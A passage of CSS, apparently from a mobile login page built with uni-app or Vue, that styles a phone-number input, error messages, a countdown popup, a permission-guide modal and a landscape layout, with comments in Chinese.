		display: flex;
		align-items: center;
		padding: 0 10px;
	}
	
	.area-code {
		color: white;
		font-size: 14px;
	}
	
	.separator {
		color: rgba(255, 255, 255, 0.5);
		margin: 0 5px;
	}
	
	.input {
		flex: 1;
		height: 45px;
		background: transparent;
		border: none;
		color: white;
		font-size: 16px;
		padding: 0 10px;
		border-bottom: 1px solid transparent;
		transition: border-color 0.3s ease;
	}
	
	.input.error {
		border-bottom: 1px solid #ff5252;
		animation: shake 0.5s ease-in-out;
	}
	
	@keyframes shake {
		0%, 100% { transform: translateX(0); }
		20%, 60% { transform: translateX(-5px); }
		40%, 80% { transform: translateX(5px); }
	}
	
	.error-message {
		color: #ff5252;
		font-size: 12px;
		padding: 5px 10px;
		margin-top: -5px;
		margin-bottom: 10px;
		text-align: left;
		background-color: rgba(255, 82, 82, 0.1);
		border-radius: 0 0 5px 5px;
	}
	
	/* 协议和版权信息样式 */
	.agreement, .copyright {
		text-align: center;
		margin-top: 15px;
		font-size: 12px;
	}
	
	.link {
		text-decoration: underline;
	}
	
	
	/* Logo和标题样式 */
	.logo-title-container {
		display: flex;
		flex-direction: column;
		align-items: center;
		margin-bottom: 20px;
		margin-top: 2px;
	}
	
	.logo-image {
		width: 160px;
		height: 160px;
		margin-bottom: -15px;
	}
	
	.login-title {
		color: white;
		font-size: 20px;
		font-weight: bold;
		text-align: center;
		margin-top: -10px;
	}
	
	/* 倒计时弹窗 */
	.countdown-overlay {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		display: flex;
		justify-content: center;
		align-items: center;
		z-index: 9999;
		background-color: rgba(0, 0, 0, 0.5);
	}
	
	.countdown-card {
		background-color: #fff;
		border-radius: 10px;
		padding: 20px;
		display: flex;
		flex-direction: column;
		align-items: center;
		width: 80%;
		max-width: 300px;
	}
	
	.countdown-icon {
		width: 60px;
		height: 60px;
		border-radius: 50%;
		background-color: #4285f4;
		display: flex;
		justify-content: center;
		align-items: center;
		margin-bottom: 15px;
	}
	
	.check-icon {
		color: white;
		font-size: 30px;
	}
	
	.countdown-text {
		text-align: center;
		font-size: 16px;
		color: #333;
	}
	
	/* 权限引导弹窗 */
	.zhezhao {
		width: 100%;
		height: 100%;
		top: 0;
		left: 0;
		background-color: rgba(0, 0, 0, 0.7);
		position: fixed;
		z-index: 9997;
	}

	.zhezhao1 {
		z-index: 9999;
	}

	.zhezhao2 {
		z-index: 9998;
	}

	.win-view {
		position: fixed;
		z-index: 9999;
		width: 90%;
		left: 50%;
		top: 50%;
		transform: translate(-50%, -50%);
		height: 350rpx;
		border-radius: 10rpx;
		background-color: #ffffff;
	}

	.win-title {
		text-align: center;
		line-height: 80rpx;
		color: #000000;
		font-weight: bold;
		font-size: 36rpx;
	}

	.win-info {
		text-align: center;
		font-size: 32rpx;
		color: #607d8b;
		line-height: 45rpx;
		padding: 20rpx;
	}

	.win-view-button {
		display: flex;
		width: 90%;
		margin-left: 5%;
	}

	.win-view-button button {
		width: 45%;
		color: #ffffff !important;
		font-size: 30rpx;
		background-color: #409eff !important;
		background-image: none !important;
		border: none !important;
	}

	.cancel-but {
		background-color: #909399 !important;
	}
	
	/* 优化语言下拉菜单 */
	@media screen and (max-height: 600px) {
		/* 在低高度屏幕上优化语言切换菜单 */
		view[v-if="showLanguageDropdown"] {
			max-height: 70vh;
			overflow-y: auto;
		}
	}
	
	/* 添加横屏模式样式 - 只调整输入区域大小 */
	@media screen and (orientation: landscape) {
		/* 横屏模式下缩小输入区域 */
		.input-container {
			margin-bottom: 10px;
			padding: 5px;
		}
		
		.input-group {
			margin-bottom: 6px;
		}
		
		.input {
			height: 32px;
			font-size: 14px;
		}
		
		/* 横屏时错误消息调整 */
		.error-message {
			padding: 2px 6px;
			margin-top: -3px;
			margin-bottom: 6px;
			font-size: 10px;
		}
		
		/* 横屏时减小表单内边距 */
		.form-box {
			padding: 12px;
		}
		
		/* 横屏模式下缩小其他元素 */
		button {
			height: 38px !important;
		}
		
		.logo-title-container {
			margin-bottom: 8px;
			margin-top: 2px;
		}
		
		.login-title {
			margin-bottom: 2px;
		}
	}
</style>
